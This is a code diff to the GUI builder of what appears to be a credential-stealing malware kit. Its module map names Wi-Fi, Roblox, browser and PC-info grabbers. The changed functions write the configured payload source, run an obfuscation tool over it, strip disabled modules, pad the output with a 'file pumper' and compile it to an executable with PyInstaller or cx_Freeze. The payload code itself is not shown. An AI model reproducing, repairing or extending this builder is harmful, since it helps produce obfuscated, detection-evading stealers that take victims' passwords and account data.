@@ -499,18 +499,11 @@ class App(customtkinter.CTk):
                 pass
                 continue
 
-    def write_and_obfuscate(self, filename):
-        with open(f"./{filename}.py", 'w', encoding="utf-8") as f:
-            f.write(self.get_config())
-
-        if self.obfuscation.get() == 1:
-            os.system(f"python ./tools/obfuscation.py ./{filename}.py")
-            os.remove(f"./{filename}.py")
-            os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
-
-
 
     def clean_false_blocks(self, input_path, output_path, config_dict):
+        import shutil
+        import re
+
         func_map = {
             "wifi": ["Wifi"],
             "roblox": ["robloxinfo"],
@@ -535,13 +528,8 @@ class App(customtkinter.CTk):
             return
 
         to_skip = set(f for k in keys_false for f in func_map.get(k, []))
-        # Regex for def or class (regardless of indentation)
         defclass_re = re.compile(r'^\s*(def|class)\s+([a-zA-Z_]\w*)\b')
-        # Regex for direct call (ex: Wifi(), PcInfo())
         call_re = re.compile(r'^\s*([a-zA-Z_]\w*)\s*\(')
-        # Regex for lists (ex: threads = [Browsers, Wifi, ...])
-        list_re = re.compile(r'^\s*(\w+)\s*=\s*\[(.*?)\]')
-        # Regex for conditional blocks if __CONFIG__["key"]:
         cond_re = re.compile(r'^\s*if\s+__CONFIG__\s*\[\s*[\'"](' + '|'.join(keys_false) + r')[\'"]\s*\]\s*:')
 
         result = []
@@ -551,7 +539,8 @@ class App(customtkinter.CTk):
         i = 0
         skip = False
         indent = 0
-        while i < len(lines):
+        n_lines = len(lines)
+        while i < n_lines:
             line = lines[i]
 
             # 1. Remove blocks if __CONFIG__["key"]:
@@ -568,7 +557,7 @@ class App(customtkinter.CTk):
                 indent = len(line) - len(line.lstrip())
                 i += 1
                 # Skip the whole block, even if it's empty
-                while i < len(lines):
+                while i < n_lines:
                     next_line = lines[i]
                     if next_line.strip() == "" or (len(next_line) - len(next_line.lstrip()) > indent):
                         i += 1
@@ -590,40 +579,92 @@ class App(customtkinter.CTk):
                 i += 1
                 continue
 
-            # 5. Clean lists (e.g., threads = [Browsers, Wifi, ...])
-            match_list = list_re.match(line)
-            if match_list:
-                items = [item.strip() for item in match_list.group(2).split(",")]
-                items = [item for item in items if item and item not in to_skip]
-                new_line = f"{match_list.group(1)} = [{', '.join(items)}]\n"
-                result.append(new_line)
-                i += 1
-                continue
-
+            # Ligne normale
             result.append(line)
             i += 1
+
+        # Patch : clean up ThreadPoolExecutor blocks
+        def cleanup_executor_blocks(lines):
+            cleaned = []
+            n = len(lines)
+            i = 0
+            while i < n:
+                line = lines[i]
+                match_with = re.match(r'^(\s*)with\s+concurrent\.futures\.ThreadPoolExecutor\(\)\s+as\s+executor:', line)
+                if match_with:
+                    block_indent = len(match_with.group(1))
+                    block_lines = []
+                    i += 1
+                    while i < n:
+                        inner_line = lines[i]
+                        if inner_line.strip() == "" or (len(inner_line) - len(inner_line.lstrip()) > block_indent):
+                            block_lines.append(inner_line)
+                            i += 1
+                        else:
+                            break
+                    # Récupère tous les submit encore présents
+                    submit_lines = [l for l in block_lines if re.match(r'^\s*executor\.submit\(([^,]+),\s*([^)]+)\)', l)]
+                    if len(submit_lines) == 1:
+                        # Simplifie en un appel direct
+                        m = re.match(r'^\s*executor\.submit\(([^,]+),\s*([^)]+)\)', submit_lines[0])
+                        func = m.group(1).strip()
+                        args = m.group(2).strip()
+                        cleaned.append(" " * block_indent + f"{func}({args})\n")
+                    elif len(submit_lines) == 0:
+                        # N'ajoute rien (bloc vide)
+                        pass
+                    else:
+                        # Garde le bloc tel quel
+                        cleaned.append(line)
+                        cleaned.extend(block_lines)
+                else:
+                    cleaned.append(line)
+                    i += 1
+            return cleaned
+
+        result = cleanup_executor_blocks(result)
 
         with open(output_path, "w", encoding="utf-8") as f:
             f.writelines(result)
 
+    def write_and_obfuscate(self, filename):
+        py_path = os.path.join(self.basefilepath, f"{filename}.py")
+        with open(py_path, 'w', encoding="utf-8") as f:
+            f.write(self.get_config())
+
+        if self.obfuscation.get() == 1:
+            # Chemin absolu pour obfuscation
+            os.system(f"python ./tools/obfuscation.py \"{py_path}\"")
+            os.remove(py_path)
+            obf_path = os.path.join(self.basefilepath, f"Obfuscated_{filename}.py")
+            os.rename(obf_path, py_path)
 
     def buildfile(self):
         filename = self.return_filename()
         cleaned_filename = f"{filename}_cleaned.py"
-    
-        # 1. Generate the source file with the config
+        py_path = os.path.join(self.basefilepath, f"{filename}.py")
+        py_cleaned_path = os.path.join(self.basefilepath, cleaned_filename)
+
+        # Générer le fichier source avec la config
         self.write_and_obfuscate(filename)
-    
-        # 2. Clean unnecessary blocks
-        self.clean_false_blocks(f"./{filename}.py", f"./{cleaned_filename}", self.updated_dictionary)
-    
-        # 3. Use the cleaned file for the rest of the build
+
+        # Nettoyer les blocs inutiles
+        self.clean_false_blocks(
+            py_path,
+            py_cleaned_path,
+            self.updated_dictionary
+        )
+
+        # Selon l'option choisie, générer le bon fichier
         if self.get_filetype() == "py":
             if self.pump.get() == 1:
                 self.file_pumper(filename + "_cleaned", "py", self.get_mb())
+            shutil.copy(py_cleaned_path, py_path)
             self.built_file()
             self.builder_frame.after(3000, self.reset_build_button())
-    
+            if os.path.exists(py_cleaned_path):
+                os.remove(py_cleaned_path)
+
         elif self.get_filetype() == "pyinstaller":
             thread = threading.Thread(target=self.compile_file, args=(filename + "_cleaned", "pyinstaller",))
             thread.start()
@@ -633,7 +674,9 @@ class App(customtkinter.CTk):
             self.built_file()
             self.builder_frame.after(3000, self.reset_build_button())
             self.cleanup_files(filename + "_cleaned")
-    
+            if os.path.exists(py_cleaned_path):
+                os.remove(py_cleaned_path)
+
         elif self.get_filetype() == "cxfreeze":
             thread = threading.Thread(target=self.compile_file, args=(filename + "_cleaned", "cxfreeze",))
             thread.start()
@@ -642,11 +685,12 @@ class App(customtkinter.CTk):
                 self.file_pumper(filename + "_cleaned", "exe", self.get_mb())
             self.built_file()
             self.builder_frame.after(3000, self.reset_build_button())
-            os.remove(f"./{cleaned_filename}")
-    
-        # Clean the intermediate file
-        if os.path.exists(f"./{filename}.py"):
-            os.remove(f"./{filename}.py")
+            if os.path.exists(py_cleaned_path):
+                os.remove(py_cleaned_path)
+
+        # Nettoyer aussi le fichier intermédiaire source .py (sauf si l'option .py est choisie)
+        if os.path.exists(py_path) and self.get_filetype() != "py":
+            os.remove(py_path)
 
 if __name__ == "__main__":
     app = App()
